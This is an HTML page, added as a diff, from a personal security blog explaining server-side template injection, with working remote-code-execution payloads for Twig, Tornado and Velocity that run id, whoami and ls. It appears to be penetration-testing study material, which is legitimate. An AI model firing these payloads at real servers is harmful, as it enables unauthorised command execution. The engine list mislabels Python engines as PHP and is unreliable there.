@@ -1,0 +1,324 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Finding and performing SSTI | this is a tech blog</title>
+  <meta name="author" content="dmeg">
+  
+  <meta name="description" content="Web pages use template engines to render dynamic data . Improper sanitization of user input could lead to Server Side Template Injection . Unlike XSS , Template injection can be used to directly attack web servers’ internals and even get Remote Code Execution ."> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Finding and performing SSTI"/>
+  <meta property="og:site_name" content="this is a tech blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+  <!-- Matomo -->
+<script type="text/javascript">
+  var _paq = window._paq = window._paq || [];
+  /* tracker methods like "setCustomDimension" should be called before "trackPageView" */
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  (function() {
+    var u="https://dmegtech.matomo.cloud/";
+    _paq.push(['setTrackerUrl', u+'matomo.php']);
+    _paq.push(['setSiteId', '1']);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+    g.type='text/javascript'; g.async=true; g.src='//cdn.matomo.cloud/dmegtech.matomo.cloud/matomo.js'; s.parentNode.insertBefore(g,s);
+  })();
+</script>
+<!-- End Matomo Code -->
+
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">this is a tech blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Finding and performing SSTI</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>Web pages use template engines to render dynamic data . Improper sanitization of user input could lead to <code>Server Side Template Injection</code> . Unlike XSS , Template injection can be used to directly attack web servers’ internals and even get Remote Code Execution .  </p>
+<a id="more"></a>
+
+<blockquote>
+<p>Template Injection can arise both through developer error, and through the intentional exposure of templates in an attempt to offer rich functionality, as commonly done by wikis, blogs, marketing applications and content management systems. Intentional template injection is such a common use-case that many template engines offer a ‘sandboxed’ mode for this express purpose. </p>
+</blockquote>
+<p>Template is a form of script that does more than just simple data binding . Since data structures are complex , templates provides some capabilities similar to programming . A common example is the template engine may allow to reach field from objects</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello &#123;&#123;user.firstName&#125;&#125; &#123;&#123;user.lastName&#125;&#125;!</span><br></pre></td></tr></table></figure>
+
+<p>So the nested properties in the above statement will not be evaluated by the language but the template will do the method call , fetch the value and pass on to the program . In addition to the syntax being simple it also powerful enough to do more than data bindings .</p>
+<p>If the engine allows the access of fields , we might be able to access interesting internal data structure . Internal data structure could have interesting state to override. They may expose powerful types.</p>
+<p>If the engine allows function calls, we are coming to target function that read files, execute commands or access internal states of the application.</p>
+<h3 id="Identifying-Template-Engine"><a href="#Identifying-Template-Engine" class="headerlink" title="Identifying Template Engine"></a>Identifying Template Engine</h3><p>Most common libraries are the following for following languages .</p>
+<ul>
+<li>C# (StringTemplate, ASPX which is used dynamically on Sharepoint)</li>
+<li>Java (Velocity, Freemarker, Pebble, Thymeleaf and Jinjava)</li>
+<li>PHP (Twig, Smarty, Dwoo, Volt, Blade, Plates, Mustache, Python, Jinja2, Tornado, mustache and String Template)</li>
+<li>Go (text/template)</li>
+</ul>
+<p>This decision tree can help in determining what templating engine it is and if it is vulnerable and to what kind of payload</p>
+<p><img src="/images/ssti.png" alt="decison-tree"></p>
+<h3 id="Twig-PHP"><a href="#Twig-PHP" class="headerlink" title="Twig (PHP)"></a>Twig (PHP)</h3><p>Twig syntax example :-</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello &#123;&#123; var &#125;&#125;</span><br><span class="line">Hello &#123;&#123; var|escape &#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>Test if it is vulnerable using </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;1338-1&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Twig has a variable _self which makes a few of the internal APISs publis . Below is a malicious payload that was created to take advantage of the <code>registerUndefinedFilterCallback</code> function. In the payload below the command <code>id</code> is executed returning the id from the current user.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Jinja2-Python"><a href="#Jinja2-Python" class="headerlink" title="Jinja2 (Python)"></a>Jinja2 (Python)</h3><p>Jinja2 syntax examples :-</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;String</span><br><span class="line">&#123;&#123; message &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;Accessing an attribute</span><br><span class="line">&#123;&#123; foo.bar &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;Accessing an attribute (alternative)</span><br><span class="line">&#123;&#123; foo[&#39;bar&#39;] &#125;&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Python metadata properties can be read from any Python object. Method calls are also not filtered. Accessing powerful operations such command execution is, however, not trivial.</p>
+</blockquote>
+<p>refer <a target="_blank" rel="noopener" href="https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti">here</a> for all jinja2 ssti</p>
+<h3 id="Tornado-Python"><a href="#Tornado-Python" class="headerlink" title="Tornado (Python)"></a>Tornado (Python)</h3><p>Tornado syntax examples :-</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello &#123;&#123;userName&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>THis supports the import directive so in the exploitation we can directly use it to get os.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;%import os%&#125;</span><br><span class="line">&#123;&#123;os.popen(&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Velocity-Java"><a href="#Velocity-Java" class="headerlink" title="Velocity (Java)"></a>Velocity (Java)</h3><p>Velocity has variable assignment.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#set( $foo &#x3D; &quot;bar&quot; )</span><br><span class="line"></span><br><span class="line">$foo</span><br></pre></td></tr></table></figure>
+
+<p>This is used to access interestung types. Here is an example payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#set($x&#x3D;&#39;&#39;)##</span><br><span class="line">#set($rt&#x3D;$x.class.forName(&#39;java.lang.Runtime&#39;))##</span><br><span class="line">#set($chr&#x3D;$x.class.forName(&#39;java.lang.Character&#39;))##</span><br><span class="line">#set($str&#x3D;$x.class.forName(&#39;java.lang.String&#39;))##</span><br><span class="line"></span><br><span class="line">#set($ex&#x3D;$rt.getRuntime().exec(&#39;ls&#39;))##</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out&#x3D;$ex.getInputStream())##</span><br><span class="line">#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2020/12/24/Finding%20and%20performing%20SSTI/" class="leancloud-visitors view" data-flag-title="Finding and performing SSTI">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2020/12/21/Privilege Escalation cheat sheet/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2020-12-24 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/METHODOLOGY/">METHODOLOGY<span>4</span></a></li> <li><a href="/tags/OSCP/">OSCP<span>4</span></a></li> <li><a href="/tags/WEB/">WEB<span>3</span></a></li> <li><a href="/tags/EXPLOIT/">EXPLOIT<span>2</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Identifying-Template-Engine"><span class="toc-article-text">Identifying Template Engine</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Twig-PHP"><span class="toc-article-text">Twig (PHP)</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Jinja2-Python"><span class="toc-article-text">Jinja2 (Python)</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Tornado-Python"><span class="toc-article-text">Tornado (Python)</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Velocity-Java"><span class="toc-article-text">Velocity (Java)</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2020 dmeg's Blog
+  
+        
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
